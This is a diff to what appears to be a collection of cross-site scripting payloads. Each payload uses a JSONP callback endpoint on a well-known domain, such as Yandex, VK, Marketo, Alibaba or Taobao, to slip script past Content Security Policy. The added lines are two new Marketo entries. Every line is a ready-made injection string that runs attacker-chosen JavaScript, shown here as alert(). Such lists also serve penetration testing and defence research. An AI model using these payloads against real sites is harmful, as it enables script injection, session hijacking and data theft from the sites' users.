@@ -10,6 +10,9 @@
 "><script+src="https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert"></script>
 #VK.com:
 "><script+src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>
+#Marketo.com
+"><script+src="http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
+"><script+src="http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
 #AlibabaGroup:
 "><script+src="https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)"></script>
 "><script+src="https://suggest.taobao.com/sug?callback=alert(1337)"></script>
